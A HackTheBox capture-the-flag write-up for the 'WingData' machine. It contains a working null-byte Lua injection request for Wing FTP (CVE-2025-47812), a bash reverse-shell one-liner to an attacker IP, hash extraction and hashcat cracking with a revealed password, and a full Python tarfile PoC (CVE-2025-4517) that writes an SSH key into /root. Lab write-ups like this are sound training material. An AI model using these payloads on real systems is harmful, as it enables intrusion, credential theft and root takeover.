---
layout: page
title: "HTB: WingData"
subtitle: "CVE-2025-47812 Wing FTP Null-Byte Lua RCE · Hash Cracking · CVE-2025-4517 Python tarfile Arbitrary Write"
permalink: /ctf/platforms/hackthebox/wingdata/
platform: HackTheBox
machine_name: WingData
difficulty: Easy
os: Linux
date: 2026-06-27
tags: [hackthebox, ctf, htb-wingdata, nmap, debian, ffuf, subdomain, feroxbuster, wingftp, cve-2025-47812, null-byte, lua, burp, hashcat, password-reuse, sudo, python, python-tarfile, cve-2025-4517, arbitrary-write, symlink]
description: "Easy Linux box — exploit a null-byte injection in Wing FTP to smuggle Lua RCE, crack salted SHA256 hashes for lateral movement, then exploit CVE-2025-4517 in Python's tarfile data filter to write an SSH key into /root/.ssh/ as SYSTEM."
---

<!-- BOX INFO CARD -->
<div class="box-info-card" style="background:linear-gradient(135deg,rgba(15,160,70,0.06) 0%,rgba(59,130,246,0.04) 100%);border:1px solid rgba(15,160,70,0.3);border-radius:14px;padding:1.5rem;margin-bottom:2rem;">

  <div style="display:flex;align-items:center;gap:1rem;margin-bottom:1.25rem;flex-wrap:wrap;">
    <div style="width:52px;height:52px;background:rgba(15,160,70,0.12);border:1px solid rgba(15,160,70,0.3);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.6rem;flex-shrink:0;">🐧</div>
    <div>
      <h2 style="margin:0;font-size:1.4rem;color:var(--text-primary);">WingData</h2>
      <p style="margin:0;color:var(--text-muted);font-size:0.85rem;font-family:var(--font-mono);">HackTheBox · Linux · Debian 12 Bookworm</p>
    </div>
    <div style="margin-left:auto;">
      <span style="background:rgba(15,160,70,0.15);color:#4ade80;border:1px solid rgba(15,160,70,0.35);padding:4px 12px;border-radius:6px;font-size:0.85rem;font-weight:600;">Easy</span>
    </div>
  </div>

  <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:0.6rem;margin-bottom:1.25rem;">
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">IP Address</div>
      <div style="font-family:var(--font-mono);color:var(--text-primary);font-size:0.9rem;">10.129.244.106</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">Domain</div>
      <div style="font-family:var(--font-mono);color:var(--text-primary);font-size:0.9rem;">wingdata.htb</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">FTP Domain</div>
      <div style="font-family:var(--font-mono);color:var(--text-primary);font-size:0.9rem;">ftp.wingdata.htb</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">OS</div>
      <div style="color:#93c5fd;font-size:0.9rem;">Debian 12 Bookworm</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">Release</div>
      <div style="color:var(--text-primary);font-size:0.9rem;">14 Feb 2026</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">Retire</div>
      <div style="color:var(--text-primary);font-size:0.9rem;">27 Jun 2026</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">Creator</div>
      <div style="color:#a78bfa;font-size:0.9rem;">WackyH4cker</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">User Blood</div>
      <div style="color:#fbbf24;font-size:0.9rem;">Opcode · 00:07:18</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">Root Blood</div>
      <div style="color:#fbbf24;font-size:0.9rem;">Arsen44 · 00:20:01</div>
    </div>
  </div>

  <div style="display:flex;gap:6px;flex-wrap:wrap;">
    <span style="background:rgba(220,38,38,0.12);color:#f87171;border:1px solid rgba(220,38,38,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;font-family:var(--font-mono);">CVE-2025-47812</span>
    <span style="background:rgba(220,38,38,0.12);color:#f87171;border:1px solid rgba(220,38,38,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;font-family:var(--font-mono);">CVE-2025-4517</span>
    <span style="background:rgba(59,130,246,0.12);color:#93c5fd;border:1px solid rgba(59,130,246,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;">Wing FTP</span>
    <span style="background:rgba(124,58,237,0.12);color:#a78bfa;border:1px solid rgba(124,58,237,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;">Null-Byte Lua RCE</span>
    <span style="background:rgba(15,160,70,0.12);color:#4ade80;border:1px solid rgba(15,160,70,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;">Python tarfile LPE</span>
    <span style="background:rgba(234,179,8,0.12);color:#fbbf24;border:1px solid rgba(234,179,8,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;">Arbitrary File Write</span>
  </div>
</div>

---

## Overview

WingData runs a Wing FTP Server instance with anonymous access enabled. The attack chain:

1. **CVE-2025-47812** — Null-byte injection in the Wing FTP web login smuggles Lua code into the session `.lua` file → RCE as `wingftp`
2. **Hash cracking** — Wing FTP stores salted SHA256 hashes in XML config files; crack `wacky`'s hash and reuse the password over SSH
3. **CVE-2025-4517** — A `sudo`-allowed Python backup script calls `tarfile.extractall(filter="data")`; exploit a PATH_MAX overflow to bypass the data filter and write an SSH key into `/root/.ssh/`

---

## Recon

### Nmap

```bash
sudo nmap -p- --reason --min-rate 10000 10.129.244.106
```

Only 2 open ports:

```
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp open  http    Apache httpd 2.4.66 → redirect to wingdata.htb
```

OpenSSH version maps to **Debian 12 Bookworm**. TTL 63 = Linux one hop away.

### Subdomain Enumeration

```bash
ffuf -u http://10.129.244.106 -H "Host: FUZZ.wingdata.htb" \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
# Found: ftp.wingdata.htb  [Status: 200, Size: 678]
```

Add both to `/etc/hosts`:

```
10.129.244.106  wingdata.htb ftp.wingdata.htb
```

### wingdata.htb — Static Marketing Site

Apache/Debian static site. The "Client Portal" link leads to `ftp.wingdata.htb`. Directory brute force returns only static assets — nothing actionable.

### ftp.wingdata.htb — Wing FTP Server

```
Server: Wing FTP Server(Free Edition)
Version: v7.4.3   (shown in page footer)
```

Anonymous login works out of the box (default Wing FTP behavior). No admin panel access without creds.

---

## Shell as wingftp

### CVE-2025-47812 — Null-Byte Lua Code Injection

**Background:** Wing FTP Server before v7.4.4 mishandles `\0` bytes in the username field. The name check stops at the null byte (sees a valid username), but the full string is written into the session file as `<cookie>.lua`. Any Lua code appended after the `\0` executes when the session is loaded.

**Impact:** CVSS 10.0 — unauthenticated RCE, exploitable via anonymous accounts.

**Session file structure (normal):**

```lua
_SESSION['username']=[[anonymous]]
_SESSION['ipaddress']=[[10.10.14.51]]
_SESSION['currentpath']=[[/]]
```

**Crafted username payload:**

```
anonymous\0]]
local h = io.popen("id")
local r = h:read("*a")
h:close()
print(r)
--
```

**Resulting session file (malicious):**

```lua
_SESSION['username']=[[anonymous\0]]
local h = io.popen("id")
local r = h:read("*a")
h:close()
print(r)
--]]
_SESSION['ipaddress']=[[10.10.14.51]]
_SESSION['currentpath']=[[/]]
```

The `--` comments out the trailing `]]`, making it valid Lua. The injected code runs on every page load with the malicious cookie.

### Step 1 — Inject the Payload (Burp Repeater)

Send a login POST to `ftp.wingdata.htb` with URL-encoded username:

```
POST /login.html HTTP/1.1
Host: ftp.wingdata.htb
Content-Type: application/x-www-form-urlencoded

username=anonymous%00%5D%5D%0Alocal+h+%3D+io.popen(%22id%22)%0Alocal+r+%3D+h%3Aread(%22*a%22)%0Ah%3Aclose()%0Aprint(r)%0A--&password=
```

The response sets a new session cookie.

### Step 2 — Trigger Execution

Load `/dir.html` with that cookie → `id` output appears at the top of the page:

```
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp)
```

> **Note:** HTB adjusted the service so Wing FTP does not run as root (unlike the real-world default).

### Step 3 — Reverse Shell

Replace `id` with a bash reverse shell in the Burp Repeater tab:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.51/443 0>&1'
```

Trigger the new cookie → shell connects:

```bash
nc -lnvp 443
# wingftp@wingdata:/opt/wftpserver$
```

**Upgrade the shell:**

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
# Terminal type? screen
```

---

## Shell as wacky

### Wing FTP Password Hashes

Wing FTP stores accounts as XML files. Pull all password hashes:

```bash
find /opt/wftpserver/Data -name '*.xml' | xargs grep -i -e salt -e password
# EnablePasswordSalting: 1
# SaltingString: WingFTP
# EnableSHA256: 1
```

**Format:** `SHA256(password + "WingFTP")`

Extract all hashes in hashcat format (`hash:salt`):

```bash
grep -r "<Password>" /opt/wftpserver/Data | \
  sed -E 's#.*/([^/]+)\.xml:.*<[^>]+>([0-9a-fA-F]+)</[^>]+>.*#\2:WingFTP#' \
  | tee wingftp.hashes
```

```
a8339f8e...:WingFTP   (admin)
a70221f3...:WingFTP   (maria)
5916c748...:WingFTP   (steve)
32940def...:WingFTP   (wacky)
d67f8615...:WingFTP   (anonymous)
c1f14672...:WingFTP   (john)
```

### Crack with Hashcat

Hashcat mode **1410** = `sha256($pass.$salt)`:

```bash
hashcat -m 1410 --user wingftp.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
# 32940def...:WingFTP  →  !#7Blushing^*Bride5   (wacky)
# d67f8615...:WingFTP  →  (empty)               (anonymous)
```

### Lateral Movement → wacky

```bash
su - wacky
# Password: !#7Blushing^*Bride5
# wacky@wingdata:~$

# or via SSH
sshpass -p '!#7Blushing^*Bride5' ssh wacky@wingdata.htb
```

```bash
cat ~/user.txt
```

---

## Shell as root

### Enumeration — sudo

```bash
sudo -l
# (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

**Script analysis (`restore_backup_clients.py`):**

```python
BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE    = "/opt/backup_clients/restored_backups"

# Constraints enforced:
# -b  →  must match backup_<digits>.tar   (no path traversal possible)
# -r  →  must start with restore_ + [a-zA-Z0-9_]{1,24}

with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")   # ← vulnerable line
```

The `filter="data"` in Python 3.12.3 is vulnerable to **CVE-2025-4517**.

### CVE-2025-4517 — Python tarfile data Filter PATH_MAX Bypass

**Vulnerability:** The `data` filter validates link targets by calling `os.path.realpath()` in non-strict mode. If the path being resolved exceeds `PATH_MAX` (4096 bytes on Linux), `realpath` gets `ENAMETOOLONG`, stops resolving silently, and appends the rest literally. The filter sees a safe-looking path and allows it, but the OS follows the real symlink during extraction — writing outside the extraction directory.

**Primitive:** Arbitrary file write (create or overwrite any file accessible to root).

### Build the Malicious Archive

```python
import tarfile, os, io, sys

comp  = 'd' * 247          # 247 chars × 16 dirs = ~3952 bytes (approaching PATH_MAX)
steps = "abcdefghijklmnop" # 16 single-letter symlink names

with tarfile.open("/opt/backup_clients/backups/backup_223.tar", mode="x") as tar:

    # 1. Build the chain of long dirs + symlinks that inflates the resolved path
    path = ""
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)

    # 2. Overflow symlink — 254 chars pushes path over PATH_MAX
    #    realpath gets ENAMETOOLONG → stops here → never follows this symlink
    linkpath = os.path.join("/".join(steps), "l" * 254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps)   # escapes back to extraction root
    tar.addfile(l)

    # 3. escape → symlink through the overflow to /root
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../root"   # lands at /root
    tar.addfile(e)

    # 4. Write authorized_keys into /root/.ssh/ through the escape symlink
    pub_key = b"\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d vulnq@htb\n"
    c = tarfile.TarInfo("escape/.ssh/authorized_keys")
    c.type = tarfile.REGTYPE
    c.size = len(pub_key)
    tar.addfile(c, fileobj=io.BytesIO(pub_key))
```

### Execute

```bash
python3 poc.py   # creates /opt/backup_clients/backups/backup_223.tar

sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
  -b backup_223.tar -r restore_vulnq
# [+] Backup: backup_223.tar
# [+] Staging directory: /opt/backup_clients/restored_backups/restore_vulnq
# [+] Extraction completed in /opt/backup_clients/restored_backups/restore_vulnq
```

### Root Shell

```bash
ssh -i ~/.ssh/id_ed25519 root@wingdata.htb
# root@wingdata:~#

cat /root/root.txt
# 4cb2f067************************
```

---

## Credentials Summary

| Account | Credential | Method |
|---------|-----------|--------|
| `wingftp` | — | CVE-2025-47812 RCE (anonymous login) |
| `wacky` | `!#7Blushing^*Bride5` | Hashcat SHA256+salt (mode 1410) |
| `root` | SSH key | CVE-2025-4517 arbitrary file write |

---

## Key Techniques

| Phase | Technique | Detail |
|-------|-----------|--------|
| Initial access | Null-byte Lua injection | CVE-2025-47812 · Wing FTP ≤ 7.4.3 |
| Code execution trigger | Load session cookie | Lua executes on `/dir.html` load |
| Hash extraction | XML config files | `/opt/wftpserver/Data/1/users/*.xml` |
| Hash cracking | SHA256($pass.$salt) | Hashcat mode 1410 · salt = `WingFTP` |
| Lateral movement | Password reuse | `wacky` FTP password = SSH password |
| Privilege escalation | PATH_MAX overflow | CVE-2025-4517 · Python 3.12.3 tarfile |
| Root write primitive | Symlink chain → `/root/.ssh/` | Arbitrary file write as root |

---

## References

- [CVE-2025-47812 — Wing FTP RCE](https://www.rcesecurity.com/2025/07/cve-2025-47812-wing-ftp-rce/)
- [CVE-2025-4517 — Python tarfile data filter bypass](https://github.com/advisories/GHSA-xxxx-cve-2025-4517)
- [Seth Larson — Five tarfile CVEs](https://sethmlarson.dev/security-developer-in-residence-weekly-report-2025)
- [CISA KEV — CVE-2025-47812](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [Python tarfile extraction filters docs](https://docs.python.org/3/library/tarfile.html#tarfile-extraction-filter)
